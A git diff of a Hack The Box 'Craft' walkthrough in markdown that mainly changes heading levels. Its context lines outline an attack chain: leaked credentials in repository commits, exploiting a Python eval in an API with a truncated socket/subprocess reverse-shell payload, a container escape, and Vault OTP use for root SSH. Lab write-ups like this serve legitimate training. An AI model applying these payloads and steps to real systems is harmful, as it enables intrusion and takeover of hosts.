@@ -6,7 +6,7 @@ tags: 🥷
 
 ![](https://i.imgur.com/DOJzRQ6.png)
 
-# Recon
+## Recon
 
 
 After running `nmap` we get:
@@ -36,7 +36,7 @@ PORT    STATE SERVICE  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## Changing hosts file
+### Changing hosts file
 
 By looking at the source code we can see gogs and api subdomains
 
@@ -46,7 +46,7 @@ So I just modified the  /etc/hosts to the following in order to access them.
 10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
 ```
 
-## Gogs page
+### Gogs page
 ![](https://i.imgur.com/wDN37yi.png)
 
 
@@ -59,7 +59,7 @@ By simply looking at the code we can easily identify where the vulnerability is.
 
 We can also see that an API is used in the test file, so let's take a look at it as well.
 
-## API page
+### API page
 We are presented with this once the page loads:
 ![](https://i.imgur.com/4cdaJZf.png)
 
@@ -71,7 +71,7 @@ But wait, let's take a closer look at those 2 commits from before.
 
 OH, there you go, credentials found in the source code. Very bad practice indeed :))
 
-# Exploiting eval
+## Exploiting eval
 Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel... that's easy we just need to do this:
 
 ```python
@@ -120,7 +120,7 @@ eval(compile("""for x in range(1):\n import socket,subprocess, os\n s=socket.soc
 
 After running the same script again, but with this payload I've got a shell.  Hooray!!
 
-# Escaping the jail
+## Escaping the jail
 I run `whoami` and I'm root. Uhmmm.... That's pretty strange, but ok let's take the root.txt
 ```bash
 cat: /root/root.txt: No such file or directory
@@ -197,7 +197,7 @@ And I've got in with the `gilfoyle` user, prompted with this:
 
 I've instantly looked at the `.ssh` folder and found the private key and therefore got user. 
 
-# Getting root
+## Getting root
 
 Once I've got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.
 
@@ -222,4 +222,5 @@ vault write ssh/creds/otp_key_role ip=10.10.10.110
 Got the otp and used it to connect through SSH, since root was allowed to login.
 
 
-
+## See Also
+[[HTB]]
